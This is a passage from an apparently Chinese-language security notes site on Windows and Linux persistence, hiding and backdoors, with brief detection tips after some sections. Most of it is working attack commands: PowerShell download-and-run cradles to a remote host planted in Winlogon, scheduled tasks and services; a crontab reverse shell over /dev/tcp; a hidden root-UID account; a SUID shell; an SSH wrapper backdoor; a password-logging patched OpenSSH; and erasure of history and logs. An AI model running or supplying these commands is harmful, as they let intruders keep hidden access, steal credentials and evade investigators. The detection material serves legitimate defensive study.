+<div class="highlight"><pre><span></span><code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+
+&quot;Userinit&quot;=&quot;C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.142:8888/logo.gif&#39;))\&quot;&quot;
+</code></pre></div>
+<p><strong>0x02 组策略设置脚本启动</strong></p>
+<p>运行gpedit.msc进入本地组策略，通过Windows设置的“脚本(启动/关机)”项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-4-3.png" /></p>
+<p>容易遇到的问题：脚本需全路径，如<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></p>
+<p><strong>0x03 计划任务</strong></p>
+<p>通过window系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p>
+<p>使用以下命令可以一键实现：</p>
+<div class="highlight"><pre><span></span><code>schtasks /create /sc minute /mo 1 /tn &quot;Security Script&quot; /tr &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&quot;\&quot;\&quot;http://192.168.28.142:8888/logo.gif\&quot;\&quot;\&quot;))\&quot;&quot;
+</code></pre></div>
+<p>容易遇到的问题：cmd命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p>
+<p>计划脚本每 1 分钟运行一次。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-4-4.png" /></p>
+<p><strong>0x04 服务自启动</strong></p>
+<p>通过服务设置自启动，结合powershell实现无文件后门。</p>
+<p>使用以下命令可实现：</p>
+<div class="highlight"><pre><span></span><code>sc create &quot;KeyName&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.142:8888/logo.gif&#39;))\&quot;&quot;
+
+sc description  KeyName &quot;Just For Test&quot;   //设置服务的描述字符串
+sc config Name start= auto                //设置这个服务为自动启动
+net start Name                            //启动服务
+</code></pre></div>
+<p>成功创建了一个自启动服务</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-4-5.png" /></p>
+<p><strong>0x05 WMI后门</strong></p>
+<p>在2015年的blackhat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。这里可以利用一个工具powersploit，下面用它的Persistence模块来示范一个简单的例子。</p>
+<div class="highlight"><pre><span></span><code>Import-Module .\Persistence\Persistence.psm1
+$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At &#39;3 PM&#39;
+$UserOptions = New-UserPersistenceOption -Registry -AtLogon
+Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
+</code></pre></div>
+<p><strong>0x06 dll劫持</strong></p>
+<p>如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一 个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。</p>
+<p>比较常用的如LPK.dll的劫持：</p>
+<p>win7及win7以上系统增加了KnownDLLs保护，需要在注册表：</p>
+<div class="highlight"><pre><span></span><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls
+</code></pre></div>
+<p>下添加 “lpk.dll” 才能顺利劫持：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-4-6.png" /></p>
+<p><strong>0x07 COM劫持</strong></p>
+<p>利用COM劫持技术，最为关键的是dll的实现以及CLSID的选择，通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例。这种方法可以绕过Autoruns对启动项的检测。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-4-7.png" /></p>
+<p><strong>0x08 远程控制</strong></p>
+<p>远控木马是一种恶意程序，其中包括在目标计算机上用于管理控制的后门。远程访问木马通常与用户请求的程序（如游戏程序）一起，是一种看不见的下载，或作为电子邮件附件发送。一旦主机系统被攻破，入侵者可以利用它来向其他易受感染的计算机分发远程访问木马，从而建立僵尸网络。</p>
+<p>一般分为客户端和服务端，如：灰鸽子、上兴远控、梦想时代、QuasarRAT等。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-4-8.png" /></p>
+<p><strong>0x09 结束语</strong></p>
+<p>未知攻焉知防，本文分享了几种Window下的自动启权限维持技术。管理员在平时运维过程应当保持警惕，掌握一定的入侵排查技巧，及时进行系统补丁更新，定期对服务器安全检查，才能有效地预防后门。</p>
+<p>参考文章：</p>
+<div class="highlight"><pre><span></span><code>常见的几种Windows后门持久化方式：https://www.freebuf.com/vuls/195906.html
+
+
+
+windows常见后门隐藏和权限维持方法
+
+https://blog.csdn.net/qq_33020901/article/details/89504902
+</code></pre></div>
+<p><a href="http://xnianq.cn/2018/07/23/windows后门种植方式收集/">http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/</a></p>
+<p>基于Python的隐秘Windows后门，使用Github作为命令和控制服务器</p>
+<p><a href="https://github.com/maldevel/canisrufus">https://github.com/maldevel/canisrufus</a></p>
+<p>注册表位置参考</p>
+<div class="highlight"><pre><span></span><code>http://www.360doc.com/content/12/0217/15/1309227_187374989.shtml
+https://www.secpulse.com/archives/103301.html
+</code></pre></div>
+<p>WMI后门参考</p>
+<div class="highlight"><pre><span></span><code>http://www.hackdig.com/11/hack-40748.htm
+https://blog.csdn.net/qq_17204441/article/details/91863383
+</code></pre></div>
+<p>无文件WMI和PowerShell后门</p>
+<div class="highlight"><pre><span></span><code>Windows 下的权限维持：https://www.anquanke.com/post/id/171528
+
+Windows下的权限维持（二）https://www.anquanke.com/post/id/172851
+</code></pre></div>
+<h2 id="3linux-">第3篇：Linux权限维持--隐藏篇<a class="headerlink" href="#3linux-" title="Permanent link">&para;</a></h2>
+<h3 id="0x00_1">0x00 前言<a class="headerlink" href="#0x00_1" title="Permanent link">&para;</a></h3>
+<p>攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。</p>
+<h3 id="0x01_1">0x01 隐藏文件<a class="headerlink" href="#0x01_1" title="Permanent link">&para;</a></h3>
+<p>Linux 下创建一个隐藏文件：<code>touch .test.txt</code></p>
+<p>touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-1.png" /></p>
+<p>一般的Linux下的隐藏目录使用命令<code>ls -l</code>是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：<code>ls -al</code></p>
+<p>这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如<code>/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/</code></p>
+<h3 id="0x02_1">0x02 隐藏文件时间戳<a class="headerlink" href="#0x02_1" title="Permanent link">&para;</a></h3>
+<p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p>
+<p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p>
+<p>利用方法</p>
+<p>touch -r index.php webshell.php</p>
+<p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p>
+<p>touch -t 1401021042.30 webshell.php</p>
+<h3 id="0x03_1">0x03 隐藏权限<a class="headerlink" href="#0x03_1" title="Permanent link">&para;</a></h3>
+<p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p>
+<p>这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。</p>
+<div class="highlight"><pre><span></span><code>chattr +i evil.php 锁定文件
+lsattr  evil.php   属性查看
+chattr -i evil.php 解除锁定
+rm -rf 1.evil.php  删除文件
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-2.png" /></p>
+<h3 id="0x04_1">0x04 隐藏历史操作命令<a class="headerlink" href="#0x04_1" title="Permanent link">&para;</a></h3>
+<p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p>
+<p>技巧一：只针对你的工作关闭历史记录</p>
+<div class="highlight"><pre><span></span><code>[space]set +o history
+备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。
+</code></pre></div>
+<p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p>
+<p>要重新开启历史功能，执行下面的命令：</p>
+<div class="highlight"><pre><span></span><code>[Space]set -o history
+它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。
+</code></pre></div>
+<p>技巧二：从历史记录中删除指定的命令</p>
+<p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p>
+<div class="highlight"><pre><span></span><code>history | grep &quot;keyword&quot;
+</code></pre></div>
+<p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>
+<div class="highlight"><pre><span></span><code>history -d [num]
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-3.png" /></p>
+<p>这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：</p>
+<div class="highlight"><pre><span></span><code>sed -i &#39;150,$d&#39; .bash_history
+</code></pre></div>
+<h3 id="0x05-ssh">0x05 隐藏远程SSH登陆记录<a class="headerlink" href="#0x05-ssh" title="Permanent link">&para;</a></h3>
+<p>隐身登录系统，不会被w、who、last等指令检测到。</p>
+<div class="highlight"><pre><span></span><code>ssh -T root@127.0.0.1 /bin/bash -i
+</code></pre></div>
+<p>不记录ssh公钥在本地.ssh目录中</p>
+<div class="highlight"><pre><span></span><code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i
+</code></pre></div>
+<h3 id="0x06">0x06 端口复用<a class="headerlink" href="#0x06" title="Permanent link">&para;</a></h3>
+<p>通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？</p>
+<p>第一种方式：通过SSLH在同一端口上共享SSH与HTTPS</p>
+<div class="highlight"><pre><span></span><code> #安装SSLH
+ sudo apt-get install sslh
+ #配置SSLH
+ 编辑 SSLH 配置文件：
+ sudo vi /etc/default/sslh
+ 1、找到下列行：Run=no  将其修改为：Run=yes
+ 2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443
+ DAEMON_OPTS=&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;
+</code></pre></div>
+<p>第二种方式：利用IPTables进行端口复用</p>
+<div class="highlight"><pre><span></span><code># 端口复用链
+iptables -t nat -N LETMEIN
+# 端口复用规则
+iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22
+# 开启开关
+iptables -A INPUT -p tcp -m string --string &#39;threathuntercoming&#39; --algo bm -m recent --set --name letmein --rsource -j ACCEPT
+# 关闭开关
+iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT
+# let&#39;s do it
+iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
+</code></pre></div>
+<p>利用方式：</p>
+<div class="highlight"><pre><span></span><code>#开启复用
+echo threathuntercoming | socat - tcp:192.168.28.128:80
+#ssh使用80端口进行登录
+ssh -p 80 root@192.168.28.128
+#关闭复用
+echo threathunterleaving | socat - tcp:192.168.28.128:80
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-4.png" /></p>
+<p>具体文章详见：<a href="https://www.freebuf.com/articles/network/137683.html">远程遥控 IPTables 进行端口复用</a></p>
+<h3 id="0x07">0x07 进程隐藏<a class="headerlink" href="#0x07" title="Permanent link">&para;</a></h3>
+<p>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。</p>
+<p>第一种方法：libprocesshider</p>
+<p>github项目地址：<a href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p>
+<p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下</p>
+<div class="highlight"><pre><span></span><code># 下载程序编译
+git clone https://github.com/gianlucaborello/libprocesshider.git
+cd libprocesshider/ &amp;&amp; make
+# 移动文件到/usr/local/lib/目录下
+cp libprocesshider.so /usr/local/lib/
+# 把它加载到全局动态连接局
+echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload
+</code></pre></div>
+<p>测试：运行 evil_script.py，</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-5.png" /></p>
+<p>此时发现在top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-6.png" /></p>
+<p>如何在Linux中发现隐藏的进程，</p>
+<p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p>
+<p>下载地址：<a href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p>
+<div class="highlight"><pre><span></span><code># 安装
+sudo yum install unhide
+# 使用
+unhide [options] test_list
+</code></pre></div>
+<p>使用<code>unhide proc</code>发现隐藏进程evil_script.py，如下图所示：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-7.png" /></p>
+<p>第二种方法：进程注入工具linux-inject</p>
+<p>linux-inject是用于将共享对象注入Linux进程的工具</p>
+<p>github项目地址： <a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p>
+<div class="highlight"><pre><span></span><code># 下载程序编译
+git clone https://github.com/gaffe23/linux-inject.git
+cd linux-inject &amp;&amp; make
+# 测试进程
+./sample-target
+# 进程注入
+./inject -n sample-target sample-library.so
+</code></pre></div>
+<p>验证进程注入成功，如下图所示：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-2-8.png" /></p>
+<p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。</p>
+<p>下载地址：<a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p>
+<div class="highlight"><pre><span></span><code># 下载解压
+wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz
+tar zxvf cymothoa-1-beta.tar.gz 
+# 
+cd cymothoa-1-beta &amp;&amp; make
+</code></pre></div>
+<h3 id="0x07_1">0x07 结语<a class="headerlink" href="#0x07_1" title="Permanent link">&para;</a></h3>
+<p>本文主要介绍了Linux下的几种隐藏技术，包括隐藏文件、隐藏权限、隐藏历史操作命令、端口复用、进程隐藏等方面的技巧。仅作抛砖引玉之用，欢迎留言分享。</p>
+<p>参考文章：</p>
+<p>Tiny Shell</p>
+<p>这款工具通过在源码中设置PROCESS_NAME为bash，以使得其运行后的进程名显示为bash。 在恶意代码中通过设置具有迷惑性的进程名字，以达到躲避管理员检查的目的。</p>
+<p><a href="https://github.com/orangetw/tsh">https://github.com/orangetw/tsh</a></p>
+<p>参考文章：<a href="https://www.freebuf.com/sectool/138350.html">https://www.freebuf.com/sectool/138350.html</a></p>
+<p>mount-bind</p>
+<p>利用mount —bind 将另外一个目录挂载覆盖至/proc/目录下指定进程ID的目录</p>
+<p>聊一聊Linux下进程隐藏的常见手法及侦测手段 <a href="https://www.anquanke.com/post/id/160843">https://www.anquanke.com/post/id/160843</a></p>
+<p>反入侵之发现后门利用mount-bind将进程和端口信息隐匿 <a href="https://www.freebuf.com/articles/network/140535.html">https://www.freebuf.com/articles/network/140535.html</a></p>
+<p><a href="https://blog.csdn.net/liuqz2009/article/details/43530201">https://blog.csdn.net/liuqz2009/article/details/43530201</a> Linux 共享库注入后门</p>
+<p>linux 进程注入后门工具Cymothoa</p>
+<p>如何隐藏你的 Linux 的命令行历史 <a href="https://www.linuxprobe.com/hidden-cmd-history.html">https://www.linuxprobe.com/hidden-cmd-history.html</a></p>
+<p>利用sslh实现端口复用 <a href="https://www.bbsmax.com/A/QW5YwpWezm/">https://www.bbsmax.com/A/QW5YwpWezm/</a></p>
+<p>远程遥控 IPTables 进行端口复用 <a href="https://www.freebuf.com/articles/network/137683.html">https://www.freebuf.com/articles/network/137683.html</a></p>
+<p>Venom 多级代理工具</p>
+<p>linux 下隐藏进程的一种方法及遇到的坑</p>
+<p><a href="https://www.jb51.net/article/147024.htm">https://www.jb51.net/article/147024.htm</a></p>
+<p>如何在 Linux/Unix/Windows 中发现隐藏的进程和端口 <a href="https://linux.cn/article-9288-1.html">https://linux.cn/article-9288-1.html</a></p>
+<h2 id="4linux-">第4篇：Linux权限维持--后门篇<a class="headerlink" href="#4linux-" title="Permanent link">&para;</a></h2>
+<p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p>
+<p><strong>1、一句话添加用户和密码</strong></p>
+<p>添加普通用户：</p>
+<div class="highlight"><pre><span></span><code># 创建一个用户名guest，密码123456的普通用户
+useradd -p `openssl passwd -1 -salt &#39;salt&#39; 123456` guest
+
+# useradd -p 方法  ` ` 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句
+useradd -p &quot;$(openssl passwd -1 123456)&quot; guest
+
+# chpasswd方法
+useradd guest;echo &#39;guest:123456&#39;|chpasswd
+
+# echo -e方法
+useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test
+</code></pre></div>
+<p>添加root用户：</p>
+<div class="highlight"><pre><span></span><code># 创建一个用户名guest，密码123456的root用户
+useradd -p `openssl passwd -1 -salt &#39;salt&#39; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test
+</code></pre></div>
+<p>可疑用户排查技巧：</p>
+<div class="highlight"><pre><span></span><code># 查询特权用户特权用户(uid 为0)
+[root@localhost ~]# awk -F: &#39;$3==0{print $1}&#39; /etc/passwd
+# 查询可以远程登录的帐号信息
+[root@localhost ~]# awk &#39;/\$1|\$6/{print $1}&#39; /etc/shadow
+# 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限
+[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;
+</code></pre></div>
+<p><strong>2、SUID Shell</strong></p>
+<p>Suid shell是一种可用于以拥有者权限运行的shell。</p>
+<div class="highlight"><pre><span></span><code>配合普通用户权限使用
+cp /bin/bash /tmp/shell
+chmod u+s /tmp/shell
+</code></pre></div>
+<p>使用guest用户登录就可疑获取root权限。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-1.png" /></p>
+<p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。</p>
+<p>排查技巧：</p>
+<div class="highlight"><pre><span></span><code># 在Linux中查找SUID设置的文件
+find . -perm /4000 
+# 在Linux中查找使用SGID设置的文件
+find . -perm /2000
+# 取消s权限
+chmod u-s /tmp/shell
+</code></pre></div>
+<p><strong>3、ssh公私钥免密登录</strong></p>
+<p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p>
+<p>客户端：</p>
+<div class="highlight"><pre><span></span><code>ssh-keygen -t rsa
+</code></pre></div>
+<p>过程中按三次回车，执行结束如下图:</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-2.png" /></p>
+<p>进入/root/.ssh/文件夹，查看文件夹的内容，如下所示：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-3.png" /></p>
+<p>其中 <code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，接下来打开<code>id_rsa.pub</code>，将内容复制到服务器。将<code>id_rsa.pub</code>的内容追加到<code>/root/.ssh/authorized_keys</code>内，配置完成。</p>
+<p>排查技巧：查看<code>/root/.ssh/authorized_keys</code>是否被修改。</p>
+<p><strong>4、软连接</strong></p>
+<p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。</p>
+<p>在目标服务器上执行一句话后门：</p>
+<div class="highlight"><pre><span></span><code>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888
+</code></pre></div>
+<p>执行完之后，任何一台机器<code>ssh root@IP -p 8888</code>，输入任意密码，成功登录。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4.png" /></p>
+<p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-4-1.png" /></p>
+<p><strong>5、SSH wrapper</strong></p>
+<p>首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p>
+<p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p>
+<p>服务端：</p>
+<div class="highlight"><pre><span></span><code>cd /usr/sbin/
+mv sshd ../bin/
+echo &#39;#!/usr/bin/perl&#39; &gt;sshd
+echo &#39;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshd
+echo &#39;exec{&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshd
+chmod u+x sshd
+/etc/init.d/sshd restart
+</code></pre></div>
+<p>客户端：</p>
+<div class="highlight"><pre><span></span><code>socat STDIO TCP4:target_ip:22,sourceport=13377
+
+#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。
+&gt;&gt;&gt; import struct
+&gt;&gt;&gt; buffer = struct.pack(&#39;&gt;I6&#39;,19526)
+&gt;&gt;&gt; print repr(buffer)
+&#39;\x00\x00LF&#39;
+&gt;&gt;&gt; buffer = struct.pack(&#39;&gt;I6&#39;,13377)
+&gt;&gt;&gt; print buffer
+4A
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-5.png" /></p>
+<p>排查技巧：</p>
+<div class="highlight"><pre><span></span><code># ls -al /usr/sbin/sshd
+# cat /usr/sbin/sshd
+可通过重装ssh服务恢复。
+</code></pre></div>
+<p><strong>6、strace后门</strong></p>
+<p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p>
+<div class="highlight"><pre><span></span><code>#vim /etc/bashrc
+alias ssh=&#39;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#39;
+# source /root/.bashrc
+</code></pre></div>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-5-1.png" /></p>
+<p>排查技巧：使用<code>alias</code>即可发现异常。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-5-2.png" /></p>
+<p><strong>7、crontab反弹shell</strong></p>
+<p>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p>
+<p>a、创建shell脚本，例如在/etc/evil.sh</p>
+<div class="highlight"><pre><span></span><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1
+chmod +sx /etc/evil.sh
+</code></pre></div>
+<p>b、crontab -e 设置定时任务</p>
+<div class="highlight"><pre><span></span><code>#每一分钟执行一次
+*/1 * * * * root /etc/evil.sh
+</code></pre></div>
+<p>重启crond服务，<code>service crond restart</code>，然后就可以用nc接收shell。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-6.png" /></p>
+<p>排查技巧：</p>
+<div class="highlight"><pre><span></span><code># 查看可疑的定时任务列表
+crontab -e
+</code></pre></div>
+<p><strong>8、openssh后门</strong></p>
+<p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p>
+<div class="highlight"><pre><span></span><code>a、备份SSH配置文件
+mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old
+mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old
+
+b、解压并安装补丁
+tar zxf openssh-5.9p1.tar.gz
+tar zxf openssh-5.9p1.tar.gz
+cp openssh-5.9p1.patch/sshbd5.9p1.diff  /openssh-5.9p1
+cd openssh-5.9p1
+patch &lt; sshbd5.9p1.diff
+
+c、记录用户名和密码的文件位置及其密码
+vi  includes.h
+    #define ILOG &quot;/tmp/1.txt&quot;             //记录登录本机的用户名和密码
+    #define OLOG &quot;/tmp/2.txt&quot;             //记录本机登录远程的用户名和密码
+    #define SECRETPW &quot;123456789&quot;          //后门的密码
+
+d、修改版本信息
+vi version.h
+    #define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;
+    #define SSH_PORTABLE &quot;小版本号&quot;
+
+e、安装并编译
+./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
+make clean
+make &amp;&amp; make install
+service sshd restart
+
+f、对比原来的配置文件，使配置文件一致，然后修改文件日期。
+
+touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config
+touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config
+
+g、清除操作记录
+export HISTFILE=/dev/null
+export HISTSIZE=0
+echo &gt;/root/.bash_history //清空操作日志
+</code></pre></div>
+<p>排查技巧：利用strace找出ssh后门.</p>
+<div class="highlight"><pre><span></span><code># 1、获取可疑进程PI
+ps aux | grep sshd
+# 2、跟踪sshd PID
+strace -o aa -ff -p  PID
+# 3、查看记录密码打开文件
+grep open sshd* | grep -v -e No -e  null -e denied| grep  WR
+</code></pre></div>
+<p><strong>9、PAM后门</strong></p>
+<p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p>
+<p>利用方法:</p>
+<div class="highlight"><pre><span></span><code>1、获取目标系统所使用的PAM版本，下载对应版本的pam版本
+2、解压缩，修改pam_unix_auth.c文件，添加万能密码
+3、编译安装PAM
+4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。
+</code></pre></div>
+<p>排查技巧：</p>
+<div class="highlight"><pre><span></span><code># 1、通过Strace跟踪ssh
+ps axu | grep sshd
+strace -o aa -ff -p PID
+grep open aa* | grep -v -e No -e null -e denied| grep WR
+# 2、检查pam_unix.so的修改时间
+stat /lib/security/pam_unix.so      #32位
+stat /lib64/security/pam_unix.so    #64位
+</code></pre></div>
+<p><strong>10、rookit后门</strong></p>
+<p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p>
+<p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p>
+<p>连接后的截图：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-5-7.png" /></p>
+<p>排查技巧：查看端口是否异常，RPM check查看命令是否被替换。</p>
+<p>参考链接：</p>
+<p>LINUX的两种后门总结(suid shell与inetd)</p>
+<p><a href="https://www.cnblogs.com/milantgh/p/3601812.html">https://www.cnblogs.com/milantgh/p/3601812.html</a></p>
+<p>linux后门总结</p>
